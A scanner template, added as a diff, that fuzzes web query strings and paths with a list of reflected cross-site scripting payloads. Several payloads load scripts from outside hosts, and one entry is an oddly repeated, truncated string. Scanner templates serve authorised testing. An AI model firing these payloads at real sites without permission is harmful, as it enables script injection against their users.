@@ -1,0 +1,97 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<style>:target {transform: rotate(180deg);}</style><figure id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></figure>"
+        - "<pre><code id=x tabindex=1></pre><input autofocus>"
+        - "<img src=\"x onerror=javascript:alert(1)\">"
+        - "<xmp style=\"background-image: url(javascript:alert(1)\">"
+        - "<input autofocus>"
+        - "<style>@keyframes x{}</style><nav style=\"animation-name:x\" onanimationend=\"alert(1)\"></nav>"
+        - "<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>"
+        - "<template draggable=\"true\" ondragend=\"alert(1)\">test</template>"
+        - "<input draggable=\"true\" ondragstart=\"alert(1)\">test</input>"
+        - "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js\" type=\"text/javascript\"></script><noscript id=x tabindex=1 onbeforefocusout=alert(1)></noscript>"
+        - "<sub id=x tabindex=1 onbeforefocusout=alert(1)></sub>"
+        - "<keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen><iframe id=y tabindex=2 onbeforedeactivate=alert(2)></iframe>"
+        - "&lt;input&gt;, &lt;input onpaste=\"alert(1)\"&gt;"
+        - "<input oninput=alert(1) autofocus>test</input><output id=x></output><script>document.getElementById(\"x\").value=document.activeElement.value</script>"
+        - "<tr id=\"alert(1)\"></tr>"
+        - "<template id=x tabindex=1 onfocusout=alert(1)></template><input id=y autofocus>"
+        - "<acronym draggable=\"true\" ondragleave=\"alert(1)\">test</acronym>"
+        - "<del onblur=alert(1) tabindex=1 id=x></del><input autofocus> <script>\\x0D<script id=x autofocus>javascript:alert(1)</script>"
+        - "<iframe src=\"http://www.google.com\" onload=alert(1)></iframe>
+<sup onfocusout=alert(&quot;xss&quot;)>test</sup>"
+        - "<video id=1 src=xss1 onerror=\"alert(1)\">x</video>"
+        - "<form style=\"position:absolute; top:0px;\" onbeforepaste=\"alert(1)\" contenteditable>test</form><input oncopy=\"alert(1)\">test</input>"
+        - "<prompt oninput=\"alert(1)\">test</prompt>"
+        - "<div id=x tabindex=1 ondeactivate=alert(1)></div>"
+        - "<input onmousedown=\"alert(1)\">test</input>"
+        - "&lt;script&gt;alert(1)&lt;/script&gt;"
+        - "<xmp onbeforecopy=\"alert(1)\" contenteditable>test</xmp>"
+        - "<iframe draggable=\"true\" ondragenter=\"alert(1)\">test</iframe>"
+        - "<template draggable=\"true\" ondragleave=\"alert(1)\">test</template>"
+        - "<pre onbeforepaste=\"alert(1)\" contenteditable>test</pre>"
+        - "<plaintext draggable=\"true\" ondragend=\"alert(1)\">test</plaintext>"
+        - "<script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</script><script>alert(1)</"
+        - "<style>:target {transform: rotate(180deg);}</style><div id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></div>"
+        - "<picture oncopy=\"alert(1)\" contenteditable>test</picture>"
+        - "<;IMG SRC=javascript:alert(1);"
+        - "<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>"
+        - "<script>alert(\"XSS\")</script>\\n"
+        - "<script>alert(1)</script>"
+        - "<plaintext onerror=\"alert(1)\">xss</plaintext>"
+        - "<script src=https://raw.githubusercontent.com/xss-payloads/xsspayloads/master/IE6-9/Javascript/HTML%2520Comment%2520XSS/jQuery%2520onload/XSS%20Payload%201.js></script>"
+        - "<form id=x tabindex=1 ondeactivate=alert(1)></form><input autofocus>"
+        - "<script src=\"https://code.jquery.com/jquery-3.1.0.min.js\"></script><img onerror=alert(1) alt=\"\" width=100 height=0><svg xmlns=\"http://www.w3.org/2000/svg\" onload=alert(1)></svg>"
+        - "<noscript id=\"x1\">alert(1)</noscript><script src=\"javascript:void(document.getElementById('x1').innerHTML);\">XSS</script>"
+        - "<textarea id=\"payloadbox\" style=\"resize: none;\" onfocusout=alert(1) tabindex=1></textarea><input autofocus>"
+        - "<acronym id=x tabindex=1></acronym><input id=y autofocus> <script>document.onfocusout=function(e){alert(1)}</script>"
+        - "<style>@keyframes x{}</style><b style=\"animation-name:x\" onanimationend=\"alert(1)\"></b>"
+        - "<p onkeydown=\"alert(1)\" contenteditable>test</p>"
+        - "<style>@keyframes slidein {}</style><table style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></table>"
+        - "<tt onblur=alert(1) tabindex=1 id=x></tt><input autofocus>"
+        - "<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>"
+        - "<div onkeydown=\"alert(1)\" contenteditable>test</div>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
